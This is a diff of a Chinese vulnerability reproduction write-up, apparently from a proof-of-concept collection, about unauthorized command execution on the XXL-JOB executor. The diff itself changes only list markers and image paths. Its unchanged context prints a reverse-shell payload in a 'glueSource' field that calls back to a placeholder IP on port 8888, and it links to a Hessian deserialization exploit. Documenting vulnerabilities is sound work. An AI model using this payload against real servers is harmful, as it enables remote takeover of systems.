@@ -8,9 +8,9 @@ XXL-JOB 是一个分布式任务调度平台，其核心设计目标是开发迅
 
 参考链接：
 
-- https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
-- https://landgrey.me/blog/18/
-- https://github.com/OneSourceCat/XxlJob-Hessian-RCE
+* https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
+* https://landgrey.me/blog/18/
+* https://github.com/OneSourceCat/XxlJob-Hessian-RCE
 
 ## 披露时间
 
@@ -44,7 +44,7 @@ docker-compose up -d
 {"code":500,"msg":"invalid request, HttpMethod not support."}
 ```
 
-![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112145544060.png)
+![](../.gitbook/assets/image-20241112145544060.png)
 
 ## 漏洞复现
 
@@ -77,11 +77,11 @@ Content-Length: 365
 }
 ```
 
-![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112145829960.png)
+![](../.gitbook/assets/image-20241112145829960.png)
 
 `touch /tmp/awesome_poc` 已成功执行：
 
-![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112145810528.png)
+![](../.gitbook/assets/image-20241112145810528.png)
 
 执行反弹 shell 命令：
 
@@ -89,10 +89,10 @@ Content-Length: 365
 "glueSource": "bash -i >& /dev/tcp/your-ip/8888 0>&1 "
 ```
 
-![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112150237169.png)
+![](../.gitbook/assets/image-20241112150237169.png)
 
 监听 8888 端口，接收反弹 shell：
 
-![](images/XXL-JOB%20executor%20未授权访问漏洞/image-20241112150213679.png)
+![](../.gitbook/assets/image-20241112150213679.png)
 
 低于 2.2.0 版本的 XXL-JOB 没有 RESTful API，我们可以通过 [Hessian反序列化](https://github.com/OneSourceCat/XxlJob-Hessian-RCE) 来执行命令。
